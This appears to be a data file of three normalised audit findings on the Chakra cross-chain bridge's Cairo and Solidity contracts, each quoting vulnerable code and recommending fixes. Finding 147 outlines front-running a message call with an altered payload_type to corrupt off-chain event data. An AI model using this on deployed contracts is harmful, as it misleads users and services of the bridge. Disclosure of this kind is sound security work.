{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-141", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 141, "page_start": null, "title": "Inconsistent Handler Validation Behavior in Cairo ERC20Handler's Cross-Chain Callback", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L114\n\n\n# Vulnerability details\n\n## Impact\nThe receive_cross_chain_callback function in the Cairo implementation of ERC20Handler uses an assert statement to validate handlers, which causes the function to revert if a handler is invalid or has been removed from the whitelist. This behavior differs from the Solidity implementation, which returns false for invalid handlers.\n\nThis vulnerability can lead to:\n\n1. Transactions remaining in a Pending state indefinitely in the Cairo implementation\n2. Inconsistent transaction states across different chain implementations\n3. Potential blocking of cross-chain operations\n4. Difficulty in handling and recovering from invalid handler scenarios\n\n## Proof of Concept\nCairo implementation:\n\n```\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n    assert(to_handler == get_contract_address(),'error to_handler');\n    assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n    assert(self.support_handler.read((from_chain, from_handler)) &&\n            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n    // ... rest of the function\n}\n```\nSolidity implementation:\n```solidity\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */,\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    if (is_valid_handler(from_chain, from_handler) == false) {\n        return false;\n    }\n\n    // ... rest of the function\n}\n```\n```solidity\n  function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nIn the Cairo version, if a handler is invalid, the function will revert due to the assert statement, leaving the transaction in its current state (likely Pending). In contrast, the Solidity version returns false, allowing the calling Settlement contract to handle the invalid handler case appropriately.\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nUpdate the Cairo implementation to check handler validity without using assert.\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe receive_cross_chain_callback function in the Cairo implementation of ERC20Handler uses an assert statement to validate handlers, which causes the function to revert if a handler is invalid or has been removed from the whitelist. This behavior differs from the Solidity implementation, which returns false for invalid handlers.\n\nThis vulnerability can lead to:\n\n1. Transactions remaining in a Pending state indefinitely in the Cairo implementation\n2. Inconsistent transaction states across different chain implementations\n3. Potential blocking of cross-chain operations\n4. Difficulty in handling and recovering from invalid handler scenarios\n", "recommendation_md": "## Recommended Mitigation Steps\nUpdate the Cairo implementation to check handler validity without using assert.\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\nCairo implementation:\n\n```\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n    assert(to_handler == get_contract_address(),'error to_handler');\n    assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n    assert(self.support_handler.read((from_chain, from_handler)) &&\n            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n    // ... rest of the function\n}\n```\nSolidity implementation:\n```solidity\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */,\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    if (is_valid_handler(from_chain, from_handler) == false) {\n        return false;\n    }\n\n    // ... rest of the function\n}\n```\n```solidity\n  function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nIn the Cairo version, if a handler is invalid, the function will revert due to the assert statement, leaving the transaction in its current state (likely Pending). In contrast, the Solidity version returns false, allowing the calling Settlement contract to handle the invalid handler case appropriately.\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L114\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L114\n\n\n# Vulnerability details\n\n## Impact\nThe receive_cross_chain_callback function in the Cairo implementation of ERC20Handler uses an assert statement to validate handlers, which causes the function to revert if a handler is invalid or has been removed from the whitelist. This behavior differs from the Solidity implementation, which returns false for invalid handlers.\n\nThis vulnerability can lead to:\n\n1. Transactions remaining in a Pending state indefinitely in the Cairo implementation\n2. Inconsistent transaction states across different chain implementations\n3. Potential blocking of cross-chain operations\n4. Difficulty in handling and recovering from invalid handler scenarios\n\n## Proof of Concept\nCairo implementation:\n\n```\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n    assert(to_handler == get_contract_address(),'error to_handler');\n    assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n    assert(self.support_handler.read((from_chain, from_handler)) &&\n            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n    // ... rest of the function\n}\n```\nSolidity implementation:\n```solidity\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */,\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    if (is_valid_handler(from_chain, from_handler) == false) {\n        return false;\n    }\n\n    // ... rest of the function\n}\n```\n```solidity\n  function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nIn the Cairo version, if a handler is invalid, the function will revert due to the assert statement, leaving the transaction in its current state (likely Pending). In contrast, the Solidity version returns false, allowing the calling Settlement contract to handle the invalid handler case appropriately.\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nUpdate the Cairo implementation to check handler validity without using assert.\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L114\n\n\n# Vulnerability details\n\n## Impact\nThe receive_cross_chain_callback function in the Cairo implementation of ERC20Handler uses an assert statement to validate handlers, which causes the function to revert if a handler is invalid or has been removed from the whitelist. This behavior differs from the Solidity implementation, which returns false for invalid handlers.\n\nThis vulnerability can lead to:\n\n1. Transactions remaining in a Pending state indefinitely in the Cairo implementation\n2. Inconsistent transaction states across different chain implementations\n3. Potential blocking of cross-chain operations\n4. Difficulty in handling and recovering from invalid handler scenarios\n\n## Proof of Concept\nCairo implementation:\n\n```\nfn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n    from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n    assert(to_handler == get_contract_address(),'error to_handler');\n    assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n    assert(self.support_handler.read((from_chain, from_handler)) && \n            self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n    // ... rest of the function\n}\n```\nSolidity implementation:\n```solidity\nfunction receive_cross_chain_callback(\n    uint256 txid,\n    string memory from_chain,\n    uint256 from_handler,\n    CrossChainMsgStatus status,\n    uint8 /* sign_type */,\n    bytes calldata /* signatures */\n) external onlySettlement returns (bool) {\n    if (is_valid_handler(from_chain, from_handler) == false) {\n        return false;\n    }\n\n    // ... rest of the function\n}\n```\n```solidity\n  function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n            ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n        } else {\n            create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nIn the Cairo version, if a handler is invalid, the function will revert due to the assert statement, leaving the transaction in its current state (likely Pending). In contrast, the Solidity version returns false, allowing the calling Settlement contract to handle the invalid handler case appropriately.\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nUpdate the Cairo implementation to check handler validity without using assert.\n\n\n## Assessed type\n\nOther"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-147", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 147, "page_start": null, "title": "In settlement.cairo::receive_cross_chain_msg - the payload_type can be passed by the user, confusing offchain systems", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L337\n\n\n# Vulnerability details\n\n## Impact\nIn `settlement.cairo::receive_cross_chain_msg` - the `payload_type` can be passed by the user, confusing offchain systems.\n\nThe `payload_type` parameter is only used to emit events so that the Chakra nodes can detect and process them.\n\nThere is no validation for it and given that it is used in an event to which off-chain systems listen to, the `payload_type` values will be displayed in the explorer, and there may be other extensions in the future, according to the sponsor.\n\nThis can lead to incorrect data being displayed and undefined behavior in the future.\n\n## Proof of Concept\nLet's see the code of `receive_cross_chain_msg`:\n```\n        fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8, <---\n        ) -> bool {\n            assert(to_chain == self.chain_name.read(), 'error to_chain');\n\n            // verify signatures\n            let mut message_hash: felt252 = LegacyHash::hash(from_chain, (cross_chain_msg_id, to_chain, from_handler, to_handler));\n            let payload_span = payload.span();\n            let mut i = 0;\n            loop {\n                if i > payload_span.len()-1{\n                    break;\n                }\n                message_hash = LegacyHash::hash(message_hash, * payload_span.at(i));\n                i += 1;\n            };\n            self.check_chakra_signatures(message_hash, signatures);\n\n            // call handler receive_cross_chain_msg\n            let handler = IHandlerDispatcher{contract_address: to_handler};\n            let success = handler.receive_cross_chain_msg(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , payload);\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n            if success{\n                status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                status = CrossChainMsgStatus::FAILED;\n            }\n\n            self.received_tx.write(cross_chain_msg_id, ReceivedTx{\n                tx_id:cross_chain_msg_id,\n                from_chain: from_chain,\n                from_handler: from_handler,\n                to_chain: to_chain,\n                to_handler: to_handler,\n                tx_status: status\n            });\n\n            // emit event\n            self.emit(CrossChainHandleResult{\n                cross_chain_settlement_id: cross_chain_msg_id,\n                from_chain: to_chain,\n                from_handler: to_handler,\n                to_chain: from_chain,\n                to_handler: from_handler,\n                cross_chain_msg_status: status,\n                payload_type: payload_type <---\n            });\n            return true;\n        }\n```\nYou can see that the `payload_type` parameter is not used anywhere in the function except for the emission of the event.\n\nSo what could happen is:\n- a user or a bot sees the transaction being processed\n- calls the `receive_cross_chain_msg` function before the Chakra off-chain system with all the right parameters except for the `payload_type`\n- since the `payload_type` is not used in the message hash generation, the signatures verification and every other check passes successfully\n- the off-chain systems pick up wrong information from the event leading to corrupted information\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nInclude the `payload_type` in the message hash generation thus making sure that it's value cannot be altered\n\n\n## Assessed type\n\nInvalid Validation\n", "sections": {"description_md": null, "impact_md": "## Impact\nIn `settlement.cairo::receive_cross_chain_msg` - the `payload_type` can be passed by the user, confusing offchain systems.\n\nThe `payload_type` parameter is only used to emit events so that the Chakra nodes can detect and process them.\n\nThere is no validation for it and given that it is used in an event to which off-chain systems listen to, the `payload_type` values will be displayed in the explorer, and there may be other extensions in the future, according to the sponsor.\n\nThis can lead to incorrect data being displayed and undefined behavior in the future.\n", "recommendation_md": "## Recommended Mitigation Steps\nInclude the `payload_type` in the message hash generation thus making sure that it's value cannot be altered\n\n\n## Assessed type\n\nInvalid Validation\n", "poc_md": "## Proof of Concept\nLet's see the code of `receive_cross_chain_msg`:\n```\n        fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8, <---\n        ) -> bool {\n            assert(to_chain == self.chain_name.read(), 'error to_chain');\n\n            // verify signatures\n            let mut message_hash: felt252 = LegacyHash::hash(from_chain, (cross_chain_msg_id, to_chain, from_handler, to_handler));\n            let payload_span = payload.span();\n            let mut i = 0;\n            loop {\n                if i > payload_span.len()-1{\n                    break;\n                }\n                message_hash = LegacyHash::hash(message_hash, * payload_span.at(i));\n                i += 1;\n            };\n            self.check_chakra_signatures(message_hash, signatures);\n\n            // call handler receive_cross_chain_msg\n            let handler = IHandlerDispatcher{contract_address: to_handler};\n            let success = handler.receive_cross_chain_msg(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , payload);\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n            if success{\n                status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                status = CrossChainMsgStatus::FAILED;\n            }\n\n            self.received_tx.write(cross_chain_msg_id, ReceivedTx{\n                tx_id:cross_chain_msg_id,\n                from_chain: from_chain,\n                from_handler: from_handler,\n                to_chain: to_chain,\n                to_handler: to_handler,\n                tx_status: status\n            });\n\n            // emit event\n            self.emit(CrossChainHandleResult{\n                cross_chain_settlement_id: cross_chain_msg_id,\n                from_chain: to_chain,\n                from_handler: to_handler,\n                to_chain: from_chain,\n                to_handler: from_handler,\n                cross_chain_msg_status: status,\n                payload_type: payload_type <---\n            });\n            return true;\n        }\n```\nYou can see that the `payload_type` parameter is not used anywhere in the function except for the emission of the event.\n\nSo what could happen is:\n- a user or a bot sees the transaction being processed\n- calls the `receive_cross_chain_msg` function before the Chakra off-chain system with all the right parameters except for the `payload_type`\n- since the `payload_type` is not used in the message hash generation, the signatures verification and every other check passes successfully\n- the off-chain systems pick up wrong information from the event leading to corrupted information\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L337\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L337\n\n\n# Vulnerability details\n\n## Impact\nIn `settlement.cairo::receive_cross_chain_msg` - the `payload_type` can be passed by the user, confusing offchain systems.\n\nThe `payload_type` parameter is only used to emit events so that the Chakra nodes can detect and process them.\n\nThere is no validation for it and given that it is used in an event to which off-chain systems listen to, the `payload_type` values will be displayed in the explorer, and there may be other extensions in the future, according to the sponsor.\n\nThis can lead to incorrect data being displayed and undefined behavior in the future.\n\n## Proof of Concept\nLet's see the code of `receive_cross_chain_msg`:\n```\n        fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8, <---\n        ) -> bool {\n            assert(to_chain == self.chain_name.read(), 'error to_chain');\n\n            // verify signatures\n            let mut message_hash: felt252 = LegacyHash::hash(from_chain, (cross_chain_msg_id, to_chain, from_handler, to_handler));\n            let payload_span = payload.span();\n            let mut i = 0;\n            loop {\n                if i > payload_span.len()-1{\n                    break;\n                }\n                message_hash = LegacyHash::hash(message_hash, * payload_span.at(i));\n                i += 1;\n            };\n            self.check_chakra_signatures(message_hash, signatures);\n\n            // call handler receive_cross_chain_msg\n            let handler = IHandlerDispatcher{contract_address: to_handler};\n            let success = handler.receive_cross_chain_msg(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , payload);\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n            if success{\n                status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                status = CrossChainMsgStatus::FAILED;\n            }\n\n            self.received_tx.write(cross_chain_msg_id, ReceivedTx{\n                tx_id:cross_chain_msg_id,\n                from_chain: from_chain,\n                from_handler: from_handler,\n                to_chain: to_chain,\n                to_handler: to_handler,\n                tx_status: status\n            });\n\n            // emit event\n            self.emit(CrossChainHandleResult{\n                cross_chain_settlement_id: cross_chain_msg_id,\n                from_chain: to_chain,\n                from_handler: to_handler,\n                to_chain: from_chain,\n                to_handler: from_handler,\n                cross_chain_msg_status: status,\n                payload_type: payload_type <---\n            });\n            return true;\n        }\n```\nYou can see that the `payload_type` parameter is not used anywhere in the function except for the emission of the event.\n\nSo what could happen is:\n- a user or a bot sees the transaction being processed\n- calls the `receive_cross_chain_msg` function before the Chakra off-chain system with all the right parameters except for the `payload_type`\n- since the `payload_type` is not used in the message hash generation, the signatures verification and every other check passes successfully\n- the off-chain systems pick up wrong information from the event leading to corrupted information\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nInclude the `payload_type` in the message hash generation thus making sure that it's value cannot be altered\n\n\n## Assessed type\n\nInvalid Validation\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/settlement/src/settlement.cairo#L337\n\n\n# Vulnerability details\n\n## Impact\nIn `settlement.cairo::receive_cross_chain_msg` - the `payload_type` can be passed by the user, confusing offchain systems. \n\nThe `payload_type` parameter is only used to emit events so that the Chakra nodes can detect and process them. \n\nThere is no validation for it and given that it is used in an event to which off-chain systems listen to, the `payload_type` values will be displayed in the explorer, and there may be other extensions in the future, according to the sponsor. \n\nThis can lead to incorrect data being displayed and undefined behavior in the future. \n\n## Proof of Concept\nLet's see the code of `receive_cross_chain_msg`:\n```\n        fn receive_cross_chain_msg(\n            ref self: ContractState,\n            cross_chain_msg_id: u256,\n            from_chain: felt252,\n            to_chain: felt252,\n            from_handler: u256,\n            to_handler: ContractAddress,\n            sign_type: u8,\n            signatures: Array<(felt252, felt252, bool)>,\n            payload: Array<u8>,\n            payload_type: u8, <---\n        ) -> bool {\n            assert(to_chain == self.chain_name.read(), 'error to_chain');\n\n            // verify signatures\n            let mut message_hash: felt252 = LegacyHash::hash(from_chain, (cross_chain_msg_id, to_chain, from_handler, to_handler));\n            let payload_span = payload.span();\n            let mut i = 0;\n            loop {\n                if i > payload_span.len()-1{\n                    break;\n                }\n                message_hash = LegacyHash::hash(message_hash, * payload_span.at(i));\n                i += 1;\n            };\n            self.check_chakra_signatures(message_hash, signatures);\n\n            // call handler receive_cross_chain_msg\n            let handler = IHandlerDispatcher{contract_address: to_handler};\n            let success = handler.receive_cross_chain_msg(cross_chain_msg_id, from_chain, to_chain, from_handler, to_handler , payload);\n\n            let mut status = CrossChainMsgStatus::SUCCESS;\n            if success{\n                status = CrossChainMsgStatus::SUCCESS;\n            }else{\n                status = CrossChainMsgStatus::FAILED;\n            }\n\n            self.received_tx.write(cross_chain_msg_id, ReceivedTx{\n                tx_id:cross_chain_msg_id,\n                from_chain: from_chain,\n                from_handler: from_handler,\n                to_chain: to_chain,\n                to_handler: to_handler,\n                tx_status: status\n            });\n\n            // emit event\n            self.emit(CrossChainHandleResult{\n                cross_chain_settlement_id: cross_chain_msg_id,\n                from_chain: to_chain,\n                from_handler: to_handler,\n                to_chain: from_chain,\n                to_handler: from_handler,\n                cross_chain_msg_status: status,\n                payload_type: payload_type <---\n            });\n            return true;\n        }\n```\nYou can see that the `payload_type` parameter is not used anywhere in the function except for the emission of the event. \n\nSo what could happen is:\n- a user or a bot sees the transaction being processed\n- calls the `receive_cross_chain_msg` function before the Chakra off-chain system with all the right parameters except for the `payload_type`\n- since the `payload_type` is not used in the message hash generation, the signatures verification and every other check passes successfully\n- the off-chain systems pick up wrong information from the event leading to corrupted information\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nInclude the `payload_type` in the message hash generation thus making sure that it's value cannot be altered\n\n\n## Assessed type\n\nInvalid Validation"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-152", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 152, "page_start": null, "title": "Status MINTED is never set for the Mint / Burn mode on Starknet", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L161\n\n\n# Vulnerability details\n\n## Impact\n\nThe current functionality of the `handler_erc20` does not set status MINTED for the Mint / Burn mode not handling the callback properly. This can lead to a violation of the spec and potential misbehavior as the information is monitored by the off-chain services.\n\n## Proof of Concept\n\nTake a look at how `CrossChainTxStatus` is set at the moment for the Mint / Burn mode:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L161\n```\n   tx_status: CrossChainTxStatus::SETTLED\n```\n\nHowever, according to the spec, status MINTED should be assigned:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/constant.cairo#L35-41\n```\npub mod CrossChainTxStatus{\n    pub const UNKNOW: u8 = 0;\n    pub const PENDING: u8 = 1;\n    pub const MINTED: u8 = 2;\n    pub const SETTLED: u8 = 3;\n    pub const FAILED: u8 = 4;\n}\n```\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nAssign status MINTED if the transaction was for Mint / Burn mode.\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\n\nThe current functionality of the `handler_erc20` does not set status MINTED for the Mint / Burn mode not handling the callback properly. This can lead to a violation of the spec and potential misbehavior as the information is monitored by the off-chain services.\n", "recommendation_md": "## Recommended Mitigation Steps\n\nAssign status MINTED if the transaction was for Mint / Burn mode.\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\n\nTake a look at how `CrossChainTxStatus` is set at the moment for the Mint / Burn mode:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L161\n```\n   tx_status: CrossChainTxStatus::SETTLED\n```\n\nHowever, according to the spec, status MINTED should be assigned:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/constant.cairo#L35-41\n```\npub mod CrossChainTxStatus{\n    pub const UNKNOW: u8 = 0;\n    pub const PENDING: u8 = 1;\n    pub const MINTED: u8 = 2;\n    pub const SETTLED: u8 = 3;\n    pub const FAILED: u8 = 4;\n}\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L161\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\n\nManual review.\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L161\n\n\n# Vulnerability details\n\n## Impact\n\nThe current functionality of the `handler_erc20` does not set status MINTED for the Mint / Burn mode not handling the callback properly. This can lead to a violation of the spec and potential misbehavior as the information is monitored by the off-chain services.\n\n## Proof of Concept\n\nTake a look at how `CrossChainTxStatus` is set at the moment for the Mint / Burn mode:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L161\n```\n   tx_status: CrossChainTxStatus::SETTLED\n```\n\nHowever, according to the spec, status MINTED should be assigned:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/constant.cairo#L35-41\n```\npub mod CrossChainTxStatus{\n    pub const UNKNOW: u8 = 0;\n    pub const PENDING: u8 = 1;\n    pub const MINTED: u8 = 2;\n    pub const SETTLED: u8 = 3;\n    pub const FAILED: u8 = 4;\n}\n```\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nAssign status MINTED if the transaction was for Mint / Burn mode.\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L161\n\n\n# Vulnerability details\n\n## Impact\n\nThe current functionality of the `handler_erc20` does not set status MINTED for the Mint / Burn mode not handling the callback properly. This can lead to a violation of the spec and potential misbehavior as the information is monitored by the off-chain services.\n\n## Proof of Concept\n\nTake a look at how `CrossChainTxStatus` is set at the moment for the Mint / Burn mode:\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L161\n```\n   tx_status: CrossChainTxStatus::SETTLED\n```\n\nHowever, according to the spec, status MINTED should be assigned:\n\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/constant.cairo#L35-41\n```\npub mod CrossChainTxStatus{\n    pub const UNKNOW: u8 = 0;\n    pub const PENDING: u8 = 1;\n    pub const MINTED: u8 = 2;\n    pub const SETTLED: u8 = 3;\n    pub const FAILED: u8 = 4;\n}\n```\n\n## Tools Used\n\nManual review.\n\n## Recommended Mitigation Steps\n\nAssign status MINTED if the transaction was for Mint / Burn 